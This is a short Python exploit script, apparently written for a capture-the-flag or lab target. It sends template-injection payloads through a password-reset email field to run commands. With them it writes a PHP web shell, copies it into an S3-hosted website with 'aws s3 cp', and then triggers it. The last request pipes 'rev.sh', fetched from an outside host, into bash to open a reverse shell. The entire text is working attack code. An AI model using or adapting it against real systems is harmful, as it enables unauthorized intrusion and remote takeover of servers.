#!/usr/bin/env python3
import requests

requests.post('http://10.10.11.113:8080/forgot/', data = {"email": """{{ .DebugCmd "echo '<?php system($_GET["cmd"]); ?>' > /tmp/.shell.php" }}"""})
requests.post('http://10.10.11.113:8080/forgot/', data = {"email": """{{ .DebugCmd "aws s3 cp /tmp/.shell.php s3://website/K4oS.php" }}"""})
requests.get('http://10.10.11.113/K4oS.php?cmd=curl%20http%3A%2F%2F10.10.14.17%3A8000%2Frev.sh%20%7C%20bash')
